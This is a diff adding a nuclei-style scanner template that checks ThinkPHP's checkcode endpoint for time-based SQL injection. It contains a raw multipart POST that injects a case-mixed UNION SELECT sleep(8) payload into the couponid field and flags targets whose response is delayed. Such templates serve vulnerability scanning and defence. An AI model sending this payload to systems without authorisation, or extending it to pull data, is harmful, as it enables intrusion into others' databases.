@@ -1,0 +1,40 @@
+id: poc-local-thinkphp-checkcode-time-sqli
+
+info:
+  name: poc-local-thinkphp-checkcode-time-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(100000000,999999999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |-
+        @timeout: 15s
+        POST /index.php?s=/home/user/checkcode/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Accept-Encoding: gzip, deflate, sdch
+        Cache-Control: no-cache
+        Content-Type: multipart/form-data; boundary=--------{{randInt}}
+        Pragma: no-cache
+
+        ----------{{randInt}}
+        Content-Disposition: form-data; name="couponid"
+
+        1')UniOn SelEct slEEp(8)#
+
+        ----------{{randInt}}--
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=8'
